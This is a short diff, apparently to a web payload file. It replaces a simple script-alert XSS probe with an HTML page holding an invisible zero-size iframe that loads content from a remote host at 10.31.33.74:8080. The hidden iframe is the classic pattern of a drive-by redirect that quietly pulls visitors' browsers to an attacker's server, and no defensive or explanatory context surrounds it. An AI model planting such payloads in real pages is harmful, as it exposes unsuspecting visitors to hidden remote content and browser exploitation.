@@ -1,1 +1,1 @@
-<script>alert("wftboom")</script>
+<html><body><iframe width = '0' height = '0' src = 'http://10.31.33.74:8080'/></body></html>
